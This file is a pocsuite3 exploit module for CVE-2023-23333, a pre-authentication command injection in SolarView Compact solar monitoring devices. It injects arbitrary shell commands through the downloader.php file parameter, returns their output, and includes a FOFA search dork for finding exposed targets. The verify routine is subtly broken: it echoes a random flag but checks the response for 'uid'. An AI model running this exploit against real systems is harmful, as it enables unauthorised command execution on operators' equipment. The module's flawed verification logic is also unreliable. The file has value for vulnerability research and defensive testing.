#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from urllib.parse import urljoin

minimum_version_required('1.9.11')


class DemoPOC(POCBase):
    name = 'SolarView Compact Pre-Auth Command Execution (CVE-2023-23333)'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'fofa': 'body="SolarView Compact" && title="Top"'}

    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('id', description='The command to execute')
        return o

    def _exploit(self, param=''):
        url = urljoin(self.url, f"/downloader.php?file=%3B{param}%00.zip")
        res = requests.get(url)
        logger.debug(res.text)
        result = res.text
        return result

    def _verify(self):
        result = {}
        if not self._check():
            return self.parse_output(result)

        flag = random_str(10)
        param = f'echo {flag}'
        res = self._exploit(param)
        if 'uid' in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['cmd'] = res
        return self.parse_output(result)

    def _attack(self):
        result = {}
        param = self.get_option('cmd')
        res = self._exploit(param)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][param] = res
        return self.parse_output(result)


register_poc(DemoPOC)
